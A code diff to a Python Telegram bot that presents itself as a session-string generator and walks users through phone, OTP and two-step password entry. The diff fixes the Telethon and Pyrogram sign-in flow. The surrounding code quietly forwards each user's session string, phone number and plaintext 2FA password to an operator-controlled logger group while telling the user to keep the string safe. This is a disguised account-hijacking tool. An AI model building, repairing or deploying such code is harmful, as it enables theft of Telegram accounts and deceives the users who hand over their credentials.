@@ -1,6 +1,7 @@
 import asyncio
 from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
+from telethon.errors import SessionPasswordNeededError
 from pyrogram import Client as PyroClient
 from pyrogram.errors import SessionPasswordNeeded
 
@@ -61,31 +62,32 @@ async def process_input(event):
         user_sessions[user_id]["phone"] = phone_number  
 
         if step == "phone_pyro":
-            client = PyroClient("pyro_session", api_id=API_ID, api_hash=API_HASH)
+            client = PyroClient(":memory:", api_id=API_ID, api_hash=API_HASH)
+            await client.connect()
+            sent_code = await client.send_code(phone_number)
         else:
             client = TelegramClient(StringSession(), API_ID, API_HASH)
+            await client.connect()
+            sent_code = await client.send_code_request(phone_number)
 
-        await client.connect()
         user_sessions[user_id]["client"] = client  
-
-        try:
-            sent_code = await client.send_code(phone_number)
-            user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  
-            user_sessions[user_id]["step"] = "otp"
-            await event.respond("🔹 **OTP Sent! Enter the OTP received on Telegram.**")
-        except Exception as e:
-            await event.respond(f"❌ **Error:** {str(e)}\n🔄 Please try again!")
-            del user_sessions[user_id]
+        user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  
+        user_sessions[user_id]["step"] = "otp"
+        await event.respond("🔹 **OTP Sent! Enter the OTP received on Telegram.**")
 
     # ✅ Step 2: Enter OTP
     elif step == "otp":
         otp_code = event.message.text.strip()
         client = user_sessions[user_id]["client"]
         phone_number = user_sessions[user_id]["phone"]
-        phone_code_hash = user_sessions[user_id].get("phone_code_hash")  
+        phone_code_hash = user_sessions[user_id]["phone_code_hash"]  
 
         try:
-            await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
+            if isinstance(client, PyroClient):
+                await client.sign_in(phone_number, phone_code_hash, otp_code)
+            else:
+                await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
+
             session_string = client.export_session_string()
 
             await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session Generated!**\n\n**👤 User:** `{user_id}`\n**📞 Phone:** `{phone_number}`\n**🔑 Session:** `{session_string}`")
@@ -93,7 +95,7 @@ async def process_input(event):
             await event.respond(f"✅ **Your Session String:**\n\n```{session_string}```\n\n🔒 **Keep this safe!**")
             del user_sessions[user_id]
 
-        except SessionPasswordNeeded:
+        except (SessionPasswordNeededError, SessionPasswordNeeded):
             user_sessions[user_id]["step"] = "password"
             await event.respond("🔑 **Enter your Telegram password (2-Step Verification).**")
         
@@ -107,7 +109,11 @@ async def process_input(event):
         client = user_sessions[user_id]["client"]
 
         try:
-            await client.check_password(password)
+            if isinstance(client, PyroClient):
+                await client.check_password(password)
+            else:
+                await client.sign_in(password=password)
+
             session_string = client.export_session_string()
 
             await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session (with 2FA)!**\n\n**👤 User:** `{user_id}`\n**🔑 Session:** `{session_string}`\n🔒 **Password Used:** `{password}`")
